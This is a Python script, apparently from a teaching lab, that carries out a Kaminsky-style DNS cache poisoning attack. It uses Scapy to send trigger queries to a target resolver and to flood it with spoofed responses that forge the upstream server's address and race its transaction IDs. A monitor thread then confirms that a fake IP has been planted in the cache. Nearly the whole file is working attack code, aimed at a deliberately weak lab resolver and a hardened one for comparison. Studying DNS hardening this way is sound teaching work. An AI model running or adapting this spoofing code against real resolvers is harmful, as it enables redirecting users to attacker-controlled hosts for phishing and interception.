#!/usr/bin/env python3
"""
attacker/attack.py — Multi-threaded DNS Cache Poisoning Attack

Architecture
────────────
  Trigger Thread  : repeatedly sends legitimate DNS queries to the target
                    resolver so it keeps issuing fresh upstream requests
                    (and therefore keeps opening new TxID slots to race).

  Flood Threads   : each thread sends spoofed DNS responses to the target,
                    covering a partition of the TxID space in tight loops.
                    Multiple threads multiply packet throughput linearly.

  Monitor Thread  : polls the target resolver every 0.5s to check whether
                    the cache has been successfully poisoned.

  Stats Thread    : prints a live counter to stdout.

Usage
─────
  # Attack the vulnerable resolver (default, should succeed fast)
  python3 attack.py <domain> <fake_ip>

  # Attack only the hardened resolver (will fail — shows immunity)
  python3 attack.py <domain> <fake_ip> --target hardened

  # Attack both and compare (best for demo)
  python3 attack.py <domain> <fake_ip> --target both --threads 6

  # More flood threads, longer attempt window
  python3 attack.py <domain> <fake_ip> --threads 8 --duration 60
"""

import argparse
import threading
import time
import sys
from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, send, sr1, conf

conf.verb = 0  # Suppress Scapy noise

# ── Resolver addresses ────────────────────────────────────────────────────────
TARGET_VULNERABLE = "10.0.0.2"
TARGET_HARDENED   = "10.0.0.6"
UPSTREAM_IP       = "10.0.0.5"
UPSTREAM_SRC_PORT = 22222     # Fixed port used by the vulnerable resolver
TXID_MIN          = 10000     # Vulnerable resolver's TxID window
TXID_MAX          = 10050


# ══════════════════════════════════════════════════════════════════════════════
# Stats  ─ thread-safe counters
# ══════════════════════════════════════════════════════════════════════════════

class Stats:
    def __init__(self):
        self._lock       = threading.Lock()
        self.sent        = 0
        self.triggers    = 0
        self.success     = False
        self.start_time  = None

    def inc_sent(self, n: int = 1):
        with self._lock:
            self.sent += n

    def inc_trigger(self):
        with self._lock:
            self.triggers += 1

    def mark_success(self):
        with self._lock:
            self.success = True

    def elapsed(self) -> float:
        return time.time() - self.start_time if self.start_time else 0.0

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "sent":     self.sent,
                "triggers": self.triggers,
                "elapsed":  self.elapsed(),
                "success":  self.success,
            }


# ══════════════════════════════════════════════════════════════════════════════
# Trigger thread  ─ keeps the resolver issuing upstream requests
# ══════════════════════════════════════════════════════════════════════════════

def trigger_loop(domain: str, target_ip: str, stats: Stats, stop: threading.Event):
    """
    Send a DNS query every ~40 ms so the resolver stays in the 'awaiting
    upstream reply' state as much as possible, maximising our race window.
    """
    pkt = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
    while not stop.is_set():
        send(pkt)
        stats.inc_trigger()
        time.sleep(0.04)


# ══════════════════════════════════════════════════════════════════════════════
# Flood thread  ─ sprays spoofed DNS responses
# ══════════════════════════════════════════════════════════════════════════════

def flood_loop(
    domain:        str,
    fake_ip:       str,
    target_ip:     str,
    upstream_port: int,
    txid_start:    int,
    txid_end:      int,
    stats:         Stats,
    stop:          threading.Event,
):
    """
    Flood the target with spoofed DNS responses for every TxID in our range.
    Source IP is forged as the upstream DNS server (10.0.0.5).
    Destination port is the resolver's known fixed upstream port (22222).

    Against the hardened resolver this will fail because:
      a) We cannot know its random ephemeral port, and
      b) We cannot forge the HMAC-SHA256 TSIG signature.
    """
    while not stop.is_set():
        for txid in range(txid_start, txid_end + 1):
            if stop.is_set():
                return
            pkt = (
                IP(src=UPSTREAM_IP, dst=target_ip)
                / UDP(sport=53, dport=upstream_port)   # sport=53 (upstream), dport=22222 (resolver's upstream sock)
                / DNS(
                    id=txid, qr=1, aa=1, rd=1, ra=1,
                    qd=DNSQR(qname=domain),
                    an=DNSRR(rrname=domain, ttl=3600, rdata=fake_ip),
                )
            )
            send(pkt)
            stats.inc_sent()


# ══════════════════════════════════════════════════════════════════════════════
# Monitor thread  ─ polls to confirm poisoning
# ══════════════════════════════════════════════════════════════════════════════

def monitor_loop(
    domain:   str,
    fake_ip:  str,
    target_ip: str,
    stats:    Stats,
    stop:     threading.Event,
):
    """Check resolver every 0.5s; stop everything on success."""
    while not stop.is_set():
        time.sleep(0.5)
        try:
            pkt  = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname=domain))
            resp = sr1(pkt, timeout=1, verbose=0)
            if resp and resp.haslayer(DNSRR):
                resolved = resp[DNSRR].rdata
                if isinstance(resolved, bytes):
                    resolved = resolved.decode()
                if str(resolved) == fake_ip:
                    stats.mark_success()
                    stop.set()
                    return
        except Exception:
            pass


# ══════════════════════════════════════════════════════════════════════════════
# Stats display thread
# ══════════════════════════════════════════════════════════════════════════════

def stats_loop(stats: Stats, stop: threading.Event):
    while not stop.is_set():
        snap = stats.snapshot()
        line = (
            f"\r  [live] Packets sent: {snap['sent']:>8,} | "
            f"Triggers: {snap['triggers']:>5} | "
            f"Elapsed: {snap['elapsed']:>6.1f}s"
        )
        sys.stdout.write(line)
        sys.stdout.flush()
        time.sleep(0.25)


# ══════════════════════════════════════════════════════════════════════════════
# Core attack runner
# ══════════════════════════════════════════════════════════════════════════════

def run_attack(
    domain:        str,
    fake_ip:       str,
    target_ip:     str,
    upstream_port: int,
    num_threads:   int,
    duration:      int,
    label:         str,
) -> bool:
    """
    Spin up all threads, wait for success or timeout, return whether poisoning occurred.
    """
    sep = "═" * 62
    print(f"\n{sep}")
    print(f"  TARGET    : {label}  ({target_ip})")
    print(f"  DOMAIN    : {domain}")
    print(f"  FAKE IP   : {fake_ip}")
    print(f"  THREADS   : {num_threads} flood  +  1 trigger")
    print(f"  UPSTREAM  : {UPSTREAM_IP}:{upstream_port}")
    print(f"  TxID RANGE: {TXID_MIN}–{TXID_MAX}  ({TXID_MAX - TXID_MIN + 1} values)")
    print(f"  MAX TIME  : {duration}s")
    print(f"{sep}\n")

    stats = Stats()
    stop  = threading.Event()
    stats.start_time = time.time()

    threads = []

    # 1 ── Trigger thread
    threads.append(threading.Thread(
        target=trigger_loop,
        args=(domain, target_ip, stats, stop),
        daemon=True,
    ))

    # N ── Flood threads, each covering a TxID partition
    total_ids  = list(range(TXID_MIN, TXID_MAX + 1))
    chunk_size = max(1, len(total_ids) // num_threads)
    for i in range(num_threads):
        t_start = total_ids[i * chunk_size]
        t_end   = total_ids[min((i + 1) * chunk_size - 1, len(total_ids) - 1)]
        threads.append(threading.Thread(
            target=flood_loop,
            args=(domain, fake_ip, target_ip, upstream_port, t_start, t_end, stats, stop),
            daemon=True,
        ))

    # 1 ── Monitor thread
    threads.append(threading.Thread(
        target=monitor_loop,
        args=(domain, fake_ip, target_ip, stats, stop),
        daemon=True,
    ))

    # 1 ── Stats display thread
    threads.append(threading.Thread(
        target=stats_loop,
        args=(stats, stop),
        daemon=True,
    ))

    for t in threads:
        t.start()

    # Block until done or deadline
    deadline = time.time() + duration
    while time.time() < deadline and not stop.is_set():
        time.sleep(0.1)
    stop.set()

    # Give threads a moment to exit cleanly
    time.sleep(0.8)
    sys.stdout.write("\n")

    snap = stats.snapshot()
    if snap["success"]:
        print(f"\n  ✓  SUCCESS — cache POISONED in {snap['elapsed']:.2f}s "
              f"after {snap['sent']:,} packets")
        print(f"     {domain}  →  {fake_ip}  is now in the cache of {target_ip}\n")
    else:
        print(f"\n  ✗  FAILED — resolver at {target_ip} was NOT poisoned "
              f"after {snap['sent']:,} packets in {snap['elapsed']:.1f}s\n")

    return snap["success"]


# ══════════════════════════════════════════════════════════════════════════════
# Entry point
# ══════════════════════════════════════════════════════════════════════════════

def main():
    parser = argparse.ArgumentParser(
        description="Multi-threaded DNS Cache Poisoning (Kaminsky-style) PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=__doc__,
    )
    parser.add_argument("domain",
                        help="Domain to poison (e.g. sprightly-torrone-5f4946.netlify.app)")
    parser.add_argument("fake_ip",
                        help="Attacker IP to inject (e.g. 10.0.0.4)")
    parser.add_argument("--target", "-T",
                        choices=["vulnerable", "hardened", "both"],
                        default="vulnerable",
                        help="Which resolver(s) to attack (default: vulnerable)")
    parser.add_argument("--threads", "-t",
                        type=int, default=4,
                        help="Flood threads per target (default: 4)")
    parser.add_argument("--duration", "-d",
                        type=int, default=30,
                        help="Max attack duration in seconds per target (default: 30)")
    args = parser.parse_args()

    # Build target list
    targets = []
    if args.target in ("vulnerable", "both"):
        targets.append((TARGET_VULNERABLE, UPSTREAM_SRC_PORT, "VULNERABLE DNS  (port 22222, TxID 10000-10050)"))
    if args.target in ("hardened", "both"):
        # Against the hardened server we still aim at port 22222, but
        # it will be rejected — the point is to show the attack fails.
        targets.append((TARGET_HARDENED, UPSTREAM_SRC_PORT, "HARDENED DNS    (random port, CSPRNG TxID, TSIG)"))

    results = {}
    for target_ip, upstream_port, label in targets:
        ok = run_attack(
            args.domain, args.fake_ip, target_ip, upstream_port,
            args.threads, args.duration, label,
        )
        results[label] = ok

    if args.target == "both":
        print("\n" + "═" * 62)
        print("  COMPARISON SUMMARY")
        print("═" * 62)
        for label, ok in results.items():
            status = "✓  POISONED" if ok else "✗  BLOCKED / IMMUNE"
            print(f"  {status:<20}  {label}")
        print("═" * 62 + "\n")


if __name__ == "__main__":
    main()
